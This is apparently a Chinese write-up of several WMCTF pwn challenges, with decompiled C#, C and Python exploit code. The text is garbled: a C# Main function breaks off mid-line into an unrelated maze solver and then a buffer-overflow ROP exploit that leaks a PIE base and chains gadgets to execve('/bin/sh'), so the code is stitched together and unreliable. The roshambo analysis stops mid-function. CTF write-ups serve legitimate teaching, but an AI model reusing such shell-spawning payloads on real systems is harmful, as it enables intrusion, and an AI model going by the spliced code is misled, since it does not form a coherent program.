# WMCTF 部分pwn题解
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
两天摸了三个pwn，剩下的cfgo-LuckyMaze，IDA反编译出来的代码实在太难看了，水平有限；baby_mac确实有相关的分析文章，无奈没有环境只能放弃。剩下三个好好总结一下。
## mengyedekending
###  解题思路
  1. 题目给了一个baby_Cat.exe以及一大堆dll，直接IDA分析baby_Cat.exe会发现找不到什么明显的逻辑，但是可以从一些类似字符串信息比如：可以猜测出这个exe实际上是在加载dll，程序主要的逻辑就在加载的dll中执行。
  2. 查看题目给的一堆dll中，会发现exe同名的baby_Cat.dll，用dnSpy x86反编译，成功定位到关键函数： 
        private unsafe static void Main(string[] args)
    {
        char* ptr = stackalloc char[(UIntPtr)100];
        int num = 1;
        int* ptr2 = (int*)(ptr + 50);
        Program [@object](https://github.com/object "@object") = new Program();
        Program.MsgHandler msgHandler = new Program.MsgHandler([@object](https://github.com/object "@object").Right);
        Program.MsgHandler msgHandler2 = new Program.MsgHandler([@object](https://github.com/object "@object").Backdoor);
        Console.WriteLine("This is a gift for you : {0:x4}", &num);
        Console.WriteLine("What do you want me to repeat?");
        ptr2[1] = 0;
        ptr2[2] = ptr;
        *ptr2 = 0;
        while (ptr2[1] = 0 and maze[row - 1][col] == 1:
             if mov(row - 1, col, maze, end, sol) == True:
                 sol.append('w')
                 return True
         if col + 1 = 0 and maze[row][col - 1] == 1:
             if mov(row, col - 1, maze, end, sol) == True:
                 sol.append('a')
                 return True
         maze[row][col] = 1
         return False
     for i in range(100):
         solve_maze(i)
         print("Done " + str(i))
     offset = 112
     ret_address = 0x158
     payload = 'A' * 112 + p64(0xc000000030) + p64(0x40) + 'A' * 0x90 + '\xCE'
     p.sendline(payload)
     p.recvuntil('Your name is : ')
     PIE_base = u64(p.recv(6).ljust(8, "\x00")) - 0x206ac0
     pop_rsp = 0x000000000008872e # pop rsp ; ret
     pop_rdi = 0x0000000000109d3d # pop rdi ; ret
     pop_rsi = 0x0000000000119c45 # pop rsi ; pop r15 ; ret
     pop_rax = 0x0000000000074e29 # pop rax ; ret
     syscall = 0x00000000000743c9 # syscall
     input_addr = 0x000000c00003edf8
     payload = 'A' * 112 + p64(0xc000000030) + p64(0x40) + 'A' * 0x90
     payload += flat([PIE_base + pop_rax, 0x3b])
     payload += flat([PIE_base + pop_rdi, 0x000000c000044ec8])
     payload += flat([PIE_base + pop_rsi, 0, 0])
     payload += flat([PIE_base + syscall])
     payload += "/bin/sh\x00"
     p.sendline(payload)
     success("PIE_base: " + hex(PIE_base))
     p.interactive()
## roshambo
###  解题思路
  1. 首先这个看起来挺复杂，其实仔细分析一下，可以理解为一个简单的游戏对战客户端，其中： 
        void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      init_buffer();
      hook_exit();
      create_file();
      open_file();
      sandbox();
      recv_client();
      puts("Welcome to WMCTF!");
      puts("Roshambo is a good game!");
      puts("Have fun!");
      while ( 1 )
        client();
    }
`main`函数下，关注`recv_client`和`client`这两个函数，分别对应两个线程，一个是接受另一个客户端的消息并作出相应的动作，一个是本地客户端，用来向其他客户端发出动作，至于如何实现的客户端也就是进程间的通信，程序采用的是管道的方式，也就是通过`mkfifo`，经过文件实现进程间的通信：
        int sub_1E55()
    {
      int result; // eax
      if ( !(unsigned int)check_input() )
      {
        puts("pipe filename is wrong!");
        quit();
      }
      strcat(file, "/tmp/");
      strcat(file, sha256_auth);
      strcat(name, file);
      strcat(name, "_GUEST");
      if ( access(file, 0) == -1 )
      {
        file_fifo = mkfifo(file, 0x1FFu);
        if ( file_fifo )
        {
          fwrite("Could not create fifo!\n", 1uLL, 0x17uLL, stderr);
          exit(-1);
        }
      }
      if ( access(name, 0) == -1 )
      {
        file_fifo = mkfifo(name, 0x1FFu);
        if ( file_fifo )
        {
          fwrite("Could not create fifo!\n", 1uLL, 0x17uLL, stderr);
          exit(-1);
        }
      }
      file_file[0] = open(file, 1);
      result = open(name, 0);
      name_file = result;
      return result;
    }
而这个函数逻辑只有在Mode C的情况下（程序提供两种模式：C & L）才会调用，也就是说必须有一个C和一个L才能互相通信，而文件名是Mode
C下通过对输入的`Authentication`进行`sha256`计算得到的，所以另一个Mode
L只要通过在输入`room`时输入这个sha256值就能建立起连接。
至于交互的细节，可以在`recv_client`中看到：
        void __fastcall __noreturn start_routine(void *a1)
    {
      _BOOL4 v1; // eax